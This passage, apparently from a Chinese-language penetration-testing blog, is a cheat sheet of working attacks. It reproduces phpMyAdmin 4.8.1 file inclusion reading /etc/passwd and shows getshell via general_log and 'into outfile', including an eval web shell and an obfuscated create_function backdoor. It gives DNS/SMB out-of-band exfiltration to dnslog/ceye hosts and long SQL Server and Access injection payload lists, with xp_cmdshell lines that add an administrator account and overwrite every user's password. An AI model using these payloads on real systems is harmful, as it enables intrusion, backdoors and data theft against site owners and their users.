src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202142769.png" alt="image-20220120220021134"></p><p>根据这个代码知道要使checkPageValidity()函数返回true,需要满足3个条件判断</p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202142548.png" alt="image-20220120220439241"></p><ol><li><p>$page变量的值在 $whilte_list数组中会返回true</p></li><li><p>经过mb_substr()和mb_strpos()处理的$page-&gt;$_page的变量值在$whitelist数组中</p></li><li><p>经过urldecode(),mb_substr(),mb_strpos()处理的$page–&gt;$_page的变量值在$_whitelist数组中，这里值的分析的是$page是经过两次url解码再进行同(2)相同的函数处理，第一次由服务器自动解码了一次，然后再由urldecode()函数解码一次，所以在构造payload的时候‘?’应该url编码两次–&gt;‘%253f’.<br> 结合这两处代码，可以开始漏洞复现了。</p></li></ol><h6 id="任意文件包含"><a href="#任意文件包含" class="headerlink" title="任意文件包含"></a><strong>任意文件包含</strong></h6><p>构造payload来包含该文件 <code>http://127.0.0.1/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd</code></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202141163.png" alt="image-20220120222107523"></p><p>利用phpMyAdmin 4.8.1后台文件包含漏洞，获取登录phpmyadmin系统所产生的sess_sessionID文件，通常linux系统中存放路径为<code>/tmp/sess_[当前会话session值]</code></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202141602.png" alt="image-20220120222149478"></p><p>写入<code>select '&lt;?php phpinfo ?&gt;' into outfile '/var/www/html/index.php' </code></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202141743.png" alt="image-20220120230642515"></p><p><code>?index.php?target=db_sql.php%253f/…/…/…/…/…/…/tmp/sess_2km6pa2qec2ci6fhmfb916mivb</code></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202141212.png" alt="image-20220120230841240"></p><h5 id="phpmyadmin-getshell实验"><a href="#phpmyadmin-getshell实验" class="headerlink" title="phpmyadmin getshell实验"></a><strong>phpmyadmin getshell实验</strong></h5><p>查看全局日志是否开启,执行如下命令：show variables like “%general%”;</p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202148099.png" alt="image-20220120232114606"></p><p>全局日志是关闭状态</p><p>执行 <code>set global general_log = on</code> 打开全局日志</p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202148671.png" alt="image-20220120232738314"><p>ssh登录 密码:ICQsafe666 查看目录权限</p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202148525.png" alt="image-20220121002402608"></p><p>执行 <code>set global general_log_file = "/var/www/html/uploads/index.php"</code> 设置日志存放路径,放在网站的根目录下</p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202148732.png" alt="image-20220120232935354"></p><h6 id="写入shell一句话马"><a href="#写入shell一句话马" class="headerlink" title="写入shell一句话马"></a><strong>写入shell一句话马</strong></h6><p>执行 <code>select "&amp;lt;?php @eval（$_POST[cmd]）;?&gt;"</code> </p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202148562.png" alt="image-20220120234031183"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202148255.png" alt="image-20220121002158042"></p><p>蚁剑连接</p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202149045.png" alt="image-20220220214919531"></p><p><strong>全局日志必须开启</strong></p><p><strong>必须有目录写权限</strong></p><p><strong>必须知道网站的绝对路径</strong></p><h5 id="第二种方法：通过-into-outfile-写入shell"><a href="#第二种方法：通过-into-outfile-写入shell" class="headerlink" title="第二种方法：通过 into outfile 写入shell"></a><strong>第二种方法：通过 into outfile 写入shell</strong></h5><p><strong>必须知道网站的绝对路径</strong></p><p>select “<!--?php $eZGQ=create_function(chr(077660/01614).base64_decode('cw==').base64_decode('bw==').chr(0276600/01600).chr(79083/783),chr(0xebee/0x256).base64_decode('dg==').str_rot13('n').str_rot13('y').chr(0x5758/0x22f).str_rot13('$').chr(01063-0700).chr(107892/972).chr(01457-01302).str_rot13('r').base64_decode('KQ==').chr(0x8f5a/0x26e));$eZGQ(base64_decode('OTExM'.'Tg4O0'.'BldkF'.'sKCRf'.''.chr(47685/561).chr(0151306/01416).str_rot13('9').chr(051530/0376).chr(0456-0330).''.''.base64_decode('Rg==').chr(0275627/01515).chr(0x35b-0x2e3).base64_decode('TQ==').str_rot13('w').''.'NdKTs'.'yNzMz'.'NTY0O'.'w=='.''));?-->“ into outfile “/var/www/html/uploads/1234.php”</p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202150034.png" alt="image-20220220215019683"></p><h3 id="数据外带"><a href="#数据外带" class="headerlink" title="数据外带"></a><strong>数据外带</strong></h3><p>​        sql注入和命令执行或xxe或ssrf, 凡是看不到回显的地方需要利用数据外带,</p><p>DNSlog和smb服务和HTTPlog或CEYE外带数据.</p><p>​        DNSlog和 SMB : mysql, mssql</p><p>​        HTTPLog: oracle, mssql</p><p>​        1. 需要有一个域名, 可以在<a href="http://dnslog.cn/">这里</a>获取一个临时的 或在 <a href="http://ceye.io/">ceye</a> 申请一个</p><p>​        2. docker 拉取dnslog 的镜像, 然后安装, 也可以</p><p>​        3. httplog服务器外带数据</p><p>​                python3 -m http.server 9000     # 开启一个http服务</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># SMB 服务器外带数据</span><br><span class="line">​1. 需要在服务器上开启smb服务</span><br><span class="line">​2. 连接指定ip地址的服务器 schtasks /create /s \\192.168.xxx.xxx /v /u admin /p 1234 /tn</span><br><span class="line">​3. select load_file('\\\\smb.xx.dmslog.cn服务器\\\xxx')</span><br><span class="line">​4. select load_file(concat('\\\\\\','  hex(version())  ', '.mysql.xxx.dnslog.xx\\xxx')) 数据外带</span><br><span class="line">​5. 只能在windows上利用</span><br></pre></td></tr></tbody></table></figure><p>有时候注入发现并没有回显，也不能利用时间盲注，那么就可以利用带外通道，也就是利用其他协议或者渠道，如http请求、DNS解析、SMB服务等将数据带出。</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(concat('\\\\',(select database()),'.xx.xx\\x));</span><br></pre></td></tr></tbody></table></figure><p>其中的load_file的地址为一个远程文件，mysql在load_file()一个远程文件时会发送dns请求包去解析，所以可以带出数据，’\data.xx.xx\x’ ，xx.xx为自己的服务器名，没有的话可以去这里 <a href="http://ceye.io/">ceye.io</a> 申请一个</p><p><strong>mysql外带数据注入条件</strong></p><p>\1. mysql.ini 中 secure_file_priv 必须为空</p><p>( ps. 修改mysql.ini 文件，在[mysqld] 下加入 secure_file_priv =  )</p><blockquote><p>mysql 新版本下secure-file-priv字段 ： secure-file-priv参数是用来限制LOAD DATA, SELECT … OUTFILE, and LOAD_FILE()传到哪个指定目录的。</p><ul><li>当secure_file_priv的值为null ，表示限制mysqld 不允许导入|导出</li><li>当secure_file_priv的值为/tmp/ ，表示限制mysqld 的导入|导出只能发生在/tmp/目录下</li><li>当secure_file_priv的值没有具体值时，表示不对mysqld 的导入|导出做限制</li></ul></blockquote><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 数据外带语法</span><br><span class="line">?id=1 and 1=(select load_file(concat('\\\\', (payload), '.mysql.dns域名\\xxx')))</span><br><span class="line"># 例如 外带数据库名出来</span><br><span class="line">?id = 1 and 1=(select load_file(concat('\\\\', (select hex(table_name) from information_schema.tables where table_schema=database() limit 0,1), '.mysql.ol84xv.dnslog.cn\\xxx')))</span><br></pre></td></tr></tbody></table></figure><h2 id="SQL-Server"><a href="#SQL-Server" class="headerlink" title="SQL_Server"></a>SQL_Server</h2><h3 id="SQL-Server联合查询"><a href="#SQL-Server联合查询" class="headerlink" title="SQL_Server联合查询"></a><strong>SQL_Server联合查询</strong></h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"># 判断注入类型</span><br><span class="line">?id=0'"\)]}--# 判断是否是字符型和闭合情况</span><br><span class="line">?id=0 and 1=1# 盘点是否是数字型</span><br><span class="line"># 判断字段数</span><br><span class="line">?id=0' order by 3# 回显正常为正确字段数</span><br><span class="line"># 判断回显位置</span><br><span class="line">?id=0' union select 1,2,3 -- </span><br><span class="line"># 查看当前库名和版本信息</span><br><span class="line">?id=0' union select 1,db_name(),@@version() --</span><br><span class="line"># 查看所有库</span><br><span class="line">?id=0' union select top 1 1,2,name from master..sysdatabases where name not in (select top 0 name from master..sysdatabases) --</span><br><span class="line"># 查看指定库中表的数量</span><br><span class="line">?id=0' union select 1,2,count(name) from 库名..sysobjects where xtype='U' --</span><br><span class="line"># 查看表</span><br><span class="line">?id=0' union select top 1 1,2,name from 库名..sysobjects where xtype='U' and name not in (select top 0 name from 库名..sysobjects where xtype=char(85)) --</span><br><span class="line"># 查看字段</span><br><span class="line">?id=0' union select top 1 1,2,name from 表名..syscolumns where xtype=char(85) and name not in (select top 0 name from 表名..syscolumns where xtype='U') --</span><br><span class="line"># 查看指定表中字段的数量</span><br><span class="line">?id=0' union select 1,2,count(*) from 库名.dbo.syscolumns where id = object_id ('表名') --</span><br><span class="line"># 查看表中字段</span><br><span class="line">?id=0' union select top 1 1,2,name from 库名..syscolumns where id = object_id('表名') and name not in (select top 0 1,2,name from 库名..syscolumns where id = object_id('表名')) --</span><br><span class="line"># 查看表中内容</span><br><span class="line">?id=0' union select top 1 1,字段1,字段2 from 表名 where 字段1 not in (select top 0 username from users) and 字段2 not in (select top 0 password from 表名) --</span><br></pre></td></tr></tbody></table></figure><h3 id="SQL-Server报错注入"><a href="#SQL-Server报错注入" class="headerlink" title="SQL_Server报错注入"></a><strong>SQL_Server报错注入</strong></h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># 测试注入点时,故意构造错误的MySQL语句,如果页面回显的错误信息为数据库报出来的错误,即可使用报错注入</span><br><span class="line"># 查看版本</span><br><span class="line">?id=0' and 1=(convert(int,@@version)) --</span><br><span class="line"># 查看所有库</span><br><span class="line">?id=0' and 1=(select top 1 name from master..sysdatabases where name not in (select top 1 name from master..sysdatabases)) --</span><br><span class="line"># 查看表</span><br><span class="line">?id=0' and 1=(select top 1 name from 库名..sysobjects where xtype='U' and name not in (select top 0 name from 库名..sysobjects where xtype='U')) --</span><br><span class="line"># 查看字段</span><br><span class="line">?id=0' and 1=(select top 1 name from 库名.dbo.syscolumns where id =object_id ('表名') and name not in (select top 0 name from 库名.dbo.syscolumns where id =object_id ('表名'))) --</span><br><span class="line"># 查看表内容</span><br><span class="line">?id=0' and 1=cast((select substring((select username,': ', password,'~' from 表名 for xml path('')),1,500))as int)--</span><br><span class="line"></span><br><span class="line"># 其他语法 爆当前库</span><br><span class="line">?id=1' and 1=convert(int,db_name()) --</span><br><span class="line">?id=1' and 1=cast(db_name() as int) --</span><br><span class="line"># 爆当前库表</span><br><span class="line">?id=1' and 1=cast((select quotename(name) from sysobjects where xtype=char(85) for xml path(''))as int) --</span><br><span class="line"># 爆当前表字段</span><br><span class="line">?id=1' and 1=cast((select quotename(name) from syscolumns where id=(select id from sysobjects where name='users' and xtype='U') for xml path(''))as int) --</span><br></pre></td></tr></tbody></table></figure><h3 id="SQL-Server布尔盲注"><a href="#SQL-Server布尔盲注" class="headerlink" title="SQL_Server布尔盲注"></a><strong>SQL_Server布尔盲注</strong></h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># 判断注入</span><br><span class="line">?id=0' and 1=0 --</span><br><span class="line">?id=0' and 1=1 --</span><br><span class="line"># 判断库数量</span><br><span class="line">?id=0' and 1=(select count(*) from master.dbo.sysdatabases where dbid=7) --</span><br><span class="line"># 判断库长度</span><br><span class="line">?id=0' and 1=(select count(*) from master.dbo.sysdatabases where dbid=1 and len(name)=6)--</span><br><span class="line"># 爆库</span><br><span class="line">?id=0' and (select top 1 ascii(substring(name,1,1)) from sys.sysdatabases where name not in (select top 0 name from sys.sysdatabases))=109--</span><br><span class="line"># 判断指定库中表的数量</span><br><span class="line">?id=0' and (select count(*) from 库名.dbo.sysobjects where name in (select top 1 name from 库名.dbo.sysobjects) and len (name)=9) --</span><br><span class="line"># 爆表 ps:substring(name,1-n,1) 表名第一个字母</span><br><span class="line">?id=0' and (select top 1 ascii(substring(name,1-n,1)) from 库名..sysobjects where name not in (select top 0 name from 库名..sysobjects))=115--</span><br></pre></td></tr></tbody></table></figure><h3 id="SQL-Server时间盲注"><a href="#SQL-Server时间盲注" class="headerlink" title="SQL_Server时间盲注"></a><strong>SQL_Server时间盲注</strong></h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 判断注入</span><br><span class="line">?id=0' waitfor delay '0:0:3' --</span><br><span class="line"># 判断库数量</span><br><span class="line">?id=0' if ((select count(*) from master.dbo.sysdatabases where dbid=7)=1) waitfor delay '0:0:3'--</span><br><span class="line"># 判断库的长度</span><br><span class="line">?id=0' if ((select count(*) from master.dbo.sysdatabases where dbid=1 and len(name)=6)=1) waitfor delay '0:0:3'--</span><br><span class="line"># 爆库</span><br><span class="line">?id=0' if (select top 1 ascii(substring(name,1,1)) from sys.sysdatabases where name not in (select top 0 name from sys.sysdatabases))=109 waitfor delay '0:0:3'--</span><br><span class="line"># 判断表数量</span><br><span class="line">?id=0' if ((select count(*) from 库名.dbo.sysobjects where name in (select top 1 name from 库名.dbo.sysobjects) and len (name)=9)=1) waitfor delay '0:0:3' --</span><br><span class="line"># 爆表 ps:substring(name,1-n,1) 表名第一个字母</span><br><span class="line">?id=0' if (select top 1 ascii(substring(name,1-n,1)) from model..sysobjects where name not in (select top 0 name from model..sysobjects))=115 waitfor delay '0:0:3'--</span><br></pre></td></tr></tbody></table></figure><h3 id="SQL-Server多语句注入"><a href="#SQL-Server多语句注入" class="headerlink" title="SQL_Server多语句注入"></a><strong>SQL_Server多语句注入</strong></h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># 只有sqlserver 可以直接注入并修改数据</span><br><span class="line"># 报错堆叠注入查看库</span><br><span class="line">?id=0'; and 1=(select top 1 name from master..sysdatabases where name not in (select top 1 name from master..sysdatabases)) --</span><br><span class="line"># 报错堆叠注入查看表</span><br><span class="line">?id=0'; and 1=(select top 1 table_name from information_schema.tables where table_name not in (select top 0 table_name from information_schema.tables)) --</span><br><span class="line"># 报错堆叠注入查看表字段</span><br><span class="line">?id=0'; and 1=(select top 1 column_name from information_schema.columns where table_name = 'users' and table_name not in (select top 1 column_name from information_schema.columns)) --</span><br><span class="line"># 新建库</span><br><span class="line">?id=0'; create dababase test --</span><br><span class="line"># 插入数据</span><br><span class="line">?id=0'; insert into users(id,username,password) values(1,'zs',123) --</span><br><span class="line"># 更改所有用户密码</span><br><span class="line">?id=0'; update users set password='123' --</span><br></pre></td></tr></tbody></table></figure><h3 id="xp-cmdshell的命令执行"><a href="#xp-cmdshell的命令执行" class="headerlink" title="xp_cmdshell的命令执行"></a><strong>xp_cmdshell的命令执行</strong></h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"># 利用xp_cmdshell 可以在系统里面执行命令</span><br><span class="line"># 默认是关闭状态,需要sha 帐号才可以开启</span><br><span class="line"># 4 条命令</span><br><span class="line"># 设置options选项</span><br><span class="line">?id=0'; exec sp_configure 'show advanced options', 1; --</span><br><span class="line"># 刷新</span><br><span class="line">?id=0'; reconfigure; --</span><br><span class="line"># 开启xp_cmdshell</span><br><span class="line">?id=0'; exec sp_configure 'xp_cmdshell', 1; --</span><br><span class="line"># 刷新</span><br><span class="line">?id=0'; reconfigure; --</span><br><span class="line"># 测试是否开启成功</span><br><span class="line"># 终端输入 curl dns.log地址, dns.log地址有回显则开启成功</span><br><span class="line">?id=1'; exec master..xp_cmdshell "linux使用curl/wget" --</span><br><span class="line"># 执行命令增加账户</span><br><span class="line">?id=1'; exec master..xp_cmdshell 'net user zs p@ssw0rd/add'; --</span><br><span class="line"># 执行命令将用户添加到管理员组</span><br><span class="line">?id=1'; exec master..xp_cmdshell "net localgroup administrators admin/add" --</span><br><span class="line">--------------------------------------------------------</span><br><span class="line">--------------------------------------------------------</span><br><span class="line"># 创建一个sqldata表,再把命令执行结果写入到表中</span><br><span class="line">?id=1'; create table sqldata(result VARCHAR(8000));--</span><br><span class="line"># 直接写入,xp_cmdshell后面可以是ipconfig或是echo 1 等等</span><br><span class="line">?id=1';INSERT INTO sqldata (result) EXEC..xp_cmdshell "net user" --</span><br><span class="line"># 或者写入 SET @adqa 将命令编码并赋值给@adqa变量,写入sqldata表</span><br><span class="line">?id=1'; DECLARE @adqa VARCHAR(8000);SET</span><br><span class="line">@adqa=0x6970636F6E666967202F616C6C;INSERT INTO sqldata(result) EXEC master..xp_cmdshell @adqa--</span><br><span class="line"># 报错注入获取命令执行结果.需要使用 isnull,清除空数据</span><br><span class="line">?id=1' and 1&lt;(select top 1 result from sqldata where result not in (select top 2 isnull(result,'') from sqldata)) --</span><br></pre></td></tr></tbody></table></figure><h3 id="SQL-server-数据外带"><a href="#SQL-server-数据外带" class="headerlink" title="SQL_server 数据外带"></a><strong>SQL_server 数据外带</strong></h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"># cmdshell 被删或绕过时, 使用下面这个函数</span><br><span class="line">xp_dirtree('dnslog')</span><br><span class="line">sp_oacreata('')</span><br><span class="line"># 1. 先定义一个变量 declare @a varchar(1024)</span><br><span class="line"># 2. 将要执行的命令赋值给变量 set @a=db_name()</span><br><span class="line"># 3. 2进制到16进制的函数, master.dbo.fn_varbintohexstr()</span><br><span class="line">-----------------------------------------------------------------------------------------------------</span><br><span class="line"># 例如: </span><br><span class="line">?id=1; declare @a varchar(1024);</span><br><span class="line">set @a = '\\'+master.dbo.fn_varbintohexstr(convert(varbinary(max),substring(@@version,1,15)))+'dns域名';</span><br><span class="line">exec xp_dirtree @a;</span><br><span class="line">?id=1; declare @a varchar(1024);</span><br><span class="line">set @a='\\'+master.dbo.fn_varbintohexstr(convert(varbinary(max),(select top 1 name from master.dbo.sysdatabases where name not in (select top 0 name from master.dbo.sysdatabases))))+'dns域名';</span><br><span class="line">exec xp_dirtree @a;</span><br><span class="line">?id=1; declare @a varchar(1024);</span><br><span class="line">set @a='\\'+master.dbo.fn_varbintohexstr(convert(varbinary(max),(select top 1 name from 库名..sysobjects where xtype=char(85) and name not in (select top 1 name from 库名..sysobjects where xtype=char(85)))))+'dns域名'</span><br><span class="line">exec xp_dirtree @a;</span><br><span class="line">-----------------------------------------------------------------------------------------------------</span><br><span class="line"># 数据外带实例</span><br><span class="line"># 爆库</span><br><span class="line">http://127.0.0.1/info.aspx?id=1;</span><br><span class="line">declare @a varchar(1024);</span><br><span class="line">set @a=(select top 1 name from master..sysdatabases where name not in</span><br><span class="line">(select top 1 name from master..sysdatabases));</span><br><span class="line">exec('master..xp_subdirs "//'%2B@a%2B'.z.xxx.ceye.io\\a" ');</span><br><span class="line"># 爆当前连接的数据库名</span><br><span class="line">http://127.0.0.1/info.aspx?id=1;</span><br><span class="line">declare @a varchar(1024);</span><br><span class="line">set @a=(select db_name());</span><br><span class="line">exec('master..xp_subdirs "//'%2B@a%2B'.z.xxx.ceye.io\\a" ');</span><br><span class="line"># master库的表数量是2033,其中用户自建表数量为20</span><br><span class="line">declare @a varchar(1024);</span><br><span class="line">set @a=(select count(name) from master..sysobjects where xtype='U');</span><br><span class="line">exec('master..xp_subdirs "//'%2B@a%2B'.z.xxx.ceye.io\\a" ');</span><br><span class="line">#</span><br><span class="line">22-57</span><br><span class="line">declare @a varchar(1024);</span><br><span class="line">set @a=(select count(name) from "22"..sysobjects where xtype='U');</span><br><span class="line">exec('master..xp_subdirs "//'%2B@a%2B'.z.xxx.ceye.io\\a" ');</span><br><span class="line"># 爆 master 库表</span><br><span class="line">declare @a varchar(1024);</span><br><span class="line">set @a=(select top 1 name from master..sysobjects where xtype=char(85) and</span><br><span class="line">name not in (select top 1 name from master..sysobjects where</span><br><span class="line">xtype=char(85)));</span><br><span class="line">exec('master..xp_subdirs "//'%2B@a%2B'.z.xxx.ceye.io\\a" ');</span><br><span class="line"># 22库中的 DB_Admin 表有11条数据</span><br><span class="line">declare @a varchar(1024);</span><br><span class="line">set @a=(select count(*) from "22".dbo.syscolumns where id = object_id</span><br><span class="line">('DB_Admin'));</span><br><span class="line">exec('master..xp_subdirs "//'%2B@a%2B'.z.xxx.ceye.io\\a" ');</span><br><span class="line"># 爆DB_Admin字段</span><br><span class="line">http://127.0.0.1/info.aspx?id=1;</span><br><span class="line">declare @a varchar(1024);</span><br><span class="line">set @a=(SELECT top 1 "22".dbo.syscolumns.name FROM</span><br><span class="line">"22"..syscolumns,"22"..sysobjects where "22"..syscolumns.id =</span><br><span class="line">"22"..sysobjects.id AND "22"..sysobjects.name='DB_Admin' and</span><br><span class="line">"22"..syscolumns.name not in (SELECT top 3 "22"..syscolumns.name FROM</span><br><span class="line">"22"..syscolumns,"22"..sysobjects where "22"..syscolumns.id =</span><br><span class="line">"22".dbo.sysobjects.id AND "22"..sysobjects.name='DB_Admin'));</span><br><span class="line">exec('master..xp_subdirs "//'%2B@a%2B'.z.xxx.ceye.io\\a" ');</span><br><span class="line"># 数据 帐号 admin</span><br><span class="line">http://127.0.0.1/info.aspx?id=1;</span><br><span class="line">declare @a varchar(1024);</span><br><span class="line">set @a=(select top 1 UserName from DB_Admin where username not in (select top</span><br><span class="line">0 username from DB_Admin));</span><br><span class="line">exec('master..xp_subdirs "//'%2B@a%2B'.z.xxx.ceye.io\\a" ');</span><br><span class="line"># 数据 密码 123456</span><br><span class="line">declare @a varchar(1024);</span><br><span class="line">set @a=(select top 1 UserName from DB_Admin where username not in (select top</span><br><span class="line">0 username from DB_Admin));</span><br><span class="line">exec('master..xp_subdirs "//'%2B@a%2B'.z.xxx.ceye.io\\a" ');</span><br><span class="line">-----------------------------------------------------------------------------------------------------</span><br><span class="line">http://127.0.0.1/info.aspx?id=1;declare @a varchar(1024);</span><br><span class="line">set @a='\\'%2bmaster.dbo.fn_varbintohexstr(CONVERT( varbinary(max), (SELECT top 1 库名.dbo.syscolumns.name FROM 库名..syscolumns,库名..sysobjects where 库名..syscolumns.id = 库名..sysobjects.id AND 库名..sysobjects.name='表名' and 库名..syscolumns.name not in (SELECT top 0 库名..syscolumns.name FROM 库名..syscolumns,库名..sysobjects where 库名..syscolumns.id = 库名.dbo.sysobjects.id AND 库名..sysobjects.name='表名'))))%2b'.z.xxx.ceye.io';</span><br><span class="line">exec xp_dirtree @a;</span><br></pre></td></tr></tbody></table></figure><h2 id="Access"><a href="#Access" class="headerlink" title="Access"></a>Access</h2><h3 id="Access-联合查询"><a href="#Access-联合查询" class="headerlink" title="Access_联合查询"></a><strong>Access_联合查询</strong></h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"># Access 只能单纯的注入拿数据,没有 information_schema 且没有库的概念, 一个文件就是一个数据库, 没有时间盲注和报错注入</span><br><span class="line"># 常用函数</span><br><span class="line">MID(str,start,length) # 可以用来提取母字符串中一部分特定的子字符串。</span><br><span class="line">ASC() # 可以返回参数中字符对应的ASCII值</span><br><span class="line">IIF(condition,true,false)</span><br><span class="line">top 1# limit函数的替代</span><br><span class="line"># 判断数据库类型</span><br><span class="line"># 返回正常为Access数据库</span><br><span class="line">?id=1 and exists(select * from msysobjects)&gt;0</span><br><span class="line"># 返回正常位MySQL数据库</span><br><span class="line">?id=1 and exists(select * from sysobject)&gt;0</span><br><span class="line"># 使用 exists 采解表名和列名</span><br><span class="line"># 联合查询时, 结尾必须加上 from 表或列名</span><br><span class="line">?id=1 union 1,2, select 4,5,6 from 表或列名</span><br><span class="line"># 判断注入</span><br><span class="line">?id=1' # 出错</span><br><span class="line">?id=1" # 出错</span><br><span class="line">?id=1 # 未出错</span><br><span class="line">?id=5-1 # 未出错,注入类型为数字型</span><br><span class="line"># 猜表名, 把 from后面 * 加进变量, 使用 burp 跑</span><br><span class="line">?id=1 and exists(select count(*) from *)</span><br><span class="line"># 判断字段数和显示位</span><br><span class="line">?id=1 order by 5</span><br><span class="line">?id=1 union select 1,2,3,4,5 from user</span><br><span class="line"># 查数据</span><br><span class="line">?id=1 union select 1,username,password,4,5,6,7,8,9,10,11 from user</span><br><span class="line"># 查表和字段内容,数据类型要保持一致,所以ID无法查询,where后 top不能从0开始</span><br><span class="line">?id=1 union select top 1 1,username,password,4,5,6,7,8,9,10,11 from user where username not in 